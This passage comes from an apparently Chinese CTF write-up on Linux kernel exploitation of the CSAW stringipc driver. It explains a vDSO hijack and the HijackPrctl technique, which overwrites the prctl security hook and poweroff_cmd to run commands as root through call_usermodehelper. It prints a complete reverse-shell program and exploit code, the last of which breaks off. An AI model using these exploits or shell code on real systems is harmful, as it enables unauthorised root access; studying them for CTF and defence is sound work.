class="built_in">puts</span>(<span class="string">"[+] shellcode is written into vdso, waiting for a reverse shell :"</span>);</span><br><span class="line">system(<span class="string">"nc -lp 3333"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] someting wrong ... "</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//show_vdso_userspace(0xc30);</span></span><br><span class="line">ioctl(fd,CSAW_CLOSE_CHANNEL,&amp;close_args);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终可以验证反弹shell提权成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(chal) gid=1000(chal) groups=1000(chal)</span><br><span class="line">/ $ ./pwn</span><br><span class="line">[+] now we get a channel 1</span><br><span class="line">[+] we can read and write any momery</span><br><span class="line">[+] found vdso ffffffff83c04000</span><br><span class="line">vdso:7ffd53da9000</span><br><span class="line">[+] shellcode is written into vdso, waiting for a reverse shell :</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><h1 id="3-HijackPrctl"><a href="#3-HijackPrctl" class="headerlink" title="3 HijackPrctl"></a>3 HijackPrctl</h1><p>强网杯中，simp1e师傅出了一道solid_core题目，用的正是此题的加强版，主要限制了内存写的范围必须大于0xffffffff80000000，并且限制了vdso的写入，预期解是这种HijackPrctl方法。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这种漏洞利用的原理在dong-hoon you(x86)分享的<new reliable="" android="" kernel="" root="" exploitation="" techniques="">中提到，这种技术被用于安卓root，可以绕过PXN防御。</new></p><p>首先在用户执行prctl函数时，实际上是将全部参数传递给security_task_prctl函数（\kernel\sys.c 2075）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line"><span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>而security_task_prctl（\security\security.c）中通过hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);将参数原封不动的传入hook进行处理，而这个hook位于内核的data段上，内核态有读写权限，因此可以通过修改这个位置劫持ptctl函数的执行流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> thisrc;</span><br><span class="line"><span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line"><span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">rc = thisrc;</span><br><span class="line"><span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在<new reliable="" android="" kernel="" root="" exploitation="" techniques="">提到了一个函数call_usermodehelper（\kernel\kmod.c 603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。但其中提到在安卓利用时需要关闭SEAndroid。另外，这个函数与execve函数参数相似，注意的是命令第一个参数必须是程序的全路径，而不能是相对路径，如”ls”必须写成”/bin/ls”，坑了好久…</new></p><p>起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * call_usermodehelper() - prepare and start a usermode application</span></span><br><span class="line"><span class="comment"> * @path: path to usermode executable</span></span><br><span class="line"><span class="comment"> * @argv: arg vector for process</span></span><br><span class="line"><span class="comment"> * @envp: environment for process</span></span><br><span class="line"><span class="comment"> * @wait: wait for the application to finish and return status.</span></span><br><span class="line"><span class="comment"> *        when UMH_NO_WAIT don't wait at all, but you get no useful error back</span></span><br><span class="line"><span class="comment"> *        when the program couldn't be exec'ed. This makes it safe to call</span></span><br><span class="line"><span class="comment"> *        from interrupt context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function is the equivalent to use call_usermodehelper_setup() and</span></span><br><span class="line"><span class="comment"> * call_usermodehelper_exec().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就把视野转向这个函数还在哪里被调用，通过ida 的x命令可以找到一共被调用了四次。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Downptomoyo_load_policy+DDcall    near ptr call_usermodehelper-2E1792h</span><br><span class="line">Downpcgroup_release_agent+CCcall    near ptr call_usermodehelper-7C191h</span><br><span class="line">Downprun_cmd+35call    near ptr call_usermodehelper-0BF9Ah</span><br><span class="line">Uppmce_do_trigger+1Bcall    call_usermodehelper+552B0h</span><br></pre></td></tr></table></figure><p>tomoyo_load_policy（security\tomoyo\load_policy.c, line 84）和cgroup_release_agent（file kernel/cgroup.c, line 5753.）限制的比较死，就不赘述了。</p><p>mce_do_trigger（arch/x86/kernel/cpu/mcheck/mce.c, line 1323）的rdi、rsi两个参数也都是data段上的地址，可以通过任意写预先将要执行的命令布置在这个地址上，从而利用call_usermodehelper执行。但是要改的东西稍微多一点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">static void mce_do_trigger(struct work_struct *work)</span><br><span class="line">&#123;</span><br><span class="line">call_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x /10i mce_do_trigger</span><br><span class="line">   0xffffffff810422b0 &lt;mce_do_trigger&gt;:data16 data16 data16 xchg ax,ax</span><br><span class="line">   0xffffffff810422b5 &lt;mce_do_trigger+5&gt;:push   rbp</span><br><span class="line">   0xffffffff810422b6 &lt;mce_do_trigger+6&gt;:xor    ecx,ecx</span><br><span class="line">   0xffffffff810422b8 &lt;mce_do_trigger+8&gt;:xor    edx,edx</span><br><span class="line">   0xffffffff810422ba &lt;mce_do_trigger+10&gt;:mov    rsi,</span><br><span class="line">   0xffffffff810422c1 &lt;mce_do_trigger+17&gt;:mov    rdi,0xffffffff8217ed20</span><br><span class="line">   0xffffffff810422c8 &lt;mce_do_trigger+24&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff810422cb &lt;mce_do_trigger+27&gt;:call   0xffffffff81097580 &lt;call_usermodehelper&gt;</span><br><span class="line">   0xffffffff810422d0 &lt;mce_do_trigger+32&gt;:pop    rbp</span><br><span class="line">   0xffffffff810422d1 &lt;mce_do_trigger+33&gt;:ret    </span><br><span class="line">pwndbg&gt; x /10s 0xffffffff8217ed20</span><br><span class="line">0xffffffff8217ed20 &lt;mce_helper&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed21 &lt;mce_helper+1&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed22 &lt;mce_helper+2&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed23 &lt;mce_helper+3&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed24 &lt;mce_helper+4&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed25 &lt;mce_helper+5&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed26 &lt;mce_helper+6&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed27 &lt;mce_helper+7&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed28 &lt;mce_helper+8&gt;:&quot;&quot;</span><br><span class="line">0xffffffff8217ed29 &lt;mce_helper+9&gt;:&quot;&quot;</span><br><span class="line">pwndbg&gt; x /10gx 0xffffffff8217ed20</span><br><span class="line">0xffffffff8217ed20 &lt;mce_helper&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0xffffffff8217ed30 &lt;mce_helper+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0xffffffff8217ed40 &lt;mce_helper+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0xffffffff8217ed50 &lt;mce_helper+48&gt;:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>最后是run_cmd（kernel/reboot.c, line 393）这个函数就比较无脑了，里面会利用argv_split自动切割参数，但cmd还是存在参数截断的问题，继续查看调用可以发现reboot_work_func和poweroff_work_func两个函数都调用了run_cmd函数，并且内置的命令都是在内核里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> **argv;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">"HOME=/"</span>,</span><br><span class="line"><span class="string">"PATH=/sbin:/bin:/usr/sbin:/usr/bin"</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">argv = argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (argv) &#123;</span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">argv_free(argv);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">Downpreboot_work_func+<span class="number">10</span>call    run_cmd</span><br><span class="line">Downppoweroff_work_func+<span class="number">18</span>call    run_cmd</span><br></pre></td></tr></table></figure><p>这里又是一个坑，我起初用的reboot_work_func函数，但这个函数所用的reboot_cmd参数在.rodata段上，不具有写权限… 而poweroff_work_func函数的poweroff_cmd参数在.data段上可读可写（为啥要差别对待？？）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i reboot_work_func</span><br><span class="line">   0xffffffff810a3690 &lt;reboot_work_func&gt;:data16 data16 data16 xchg ax,ax</span><br><span class="line">   0xffffffff810a3695 &lt;reboot_work_func+5&gt;:push   rbp</span><br><span class="line">   0xffffffff810a3696 &lt;reboot_work_func+6&gt;:mov    rdi,0xffffffff81a26f80</span><br><span class="line">   0xffffffff810a369d &lt;reboot_work_func+13&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff810a36a0 &lt;reboot_work_func+16&gt;:call   0xffffffff810a34e0 &lt;run_cmd&gt;</span><br><span class="line">pwndbg&gt; x /s 0xffffffff81a26f80</span><br><span class="line">0xffffffff81a26f80 &lt;reboot_cmd&gt;:&quot;/sbin/reboot&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /7i poweroff_work_func</span><br><span class="line">   0xffffffff810a39c0 &lt;poweroff_work_func&gt;:data16 data16 data16 xchg ax,ax</span><br><span class="line">   0xffffffff810a39c5 &lt;poweroff_work_func+5&gt;:push   rbp</span><br><span class="line">   0xffffffff810a39c6 &lt;poweroff_work_func+6&gt;:mov    rdi,0xffffffff81e4dfa0</span><br><span class="line">   0xffffffff810a39cd &lt;poweroff_work_func+13&gt;:mov    rbp,rsp</span><br><span class="line">   0xffffffff810a39d0 &lt;poweroff_work_func+16&gt;:push   rbx</span><br><span class="line">   0xffffffff810a39d1 &lt;poweroff_work_func+17&gt;:movzx  ebx,BYTE PTR [rip+0x1157ad8]        # 0xffffffff821fb4b0 &lt;poweroff_force&gt;</span><br><span class="line">   0xffffffff810a39d8 &lt;poweroff_work_func+24&gt;:call   0xffffffff810a34e0 &lt;run_cmd&gt;</span><br><span class="line">pwndbg&gt; x /s 0xffffffff81e4dfa0</span><br><span class="line">0xffffffff81e4dfa0 &lt;poweroff_cmd&gt;:&quot;/sbin/poweroff&quot;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先可以利用VDSO的爆破得到VDSO的地址，而不难发现VDSO在vmlinux代码中，可以通过ida的可见字符串的__vdso_gettimeofday很容找到其偏移，从而得到kernel base。</p><p>而得到kernel base之后，就可以找到需要覆写的hook位置和字符串地址了。</p><p>通过将prctl_hook覆写为poweroff_work_func地址，并将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。</p><p>在此处我没有调用selinux_disable就执行了call_usermodehelper，在我搭建的环境和强网杯solid_core给出的离线环境中都没有被selinux阻止。</p><h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><p>reverse_shell.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sockfd,numbytes;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">their_addr</span>;</span></span><br><span class="line">    <span class="keyword">while</span>((sockfd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>)) == <span class="number">-1</span>);</span><br><span class="line">    their_addr.sin_family = AF_INET;</span><br><span class="line">    their_addr.sin_port = htons(<span class="number">2333</span>);</span><br><span class="line">    their_addr.sin_addr.s_addr=inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">    bzero(&amp;(their_addr.sin_zero), <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(connect(sockfd,(struct sockaddr*)&amp;their_addr,<span class="keyword">sizeof</span>(struct sockaddr)) == <span class="number">-1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">0</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">1</span>);</span><br><span class="line">    dup2(sockfd,<span class="number">2</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pwn_hijackprctl.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;       </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span 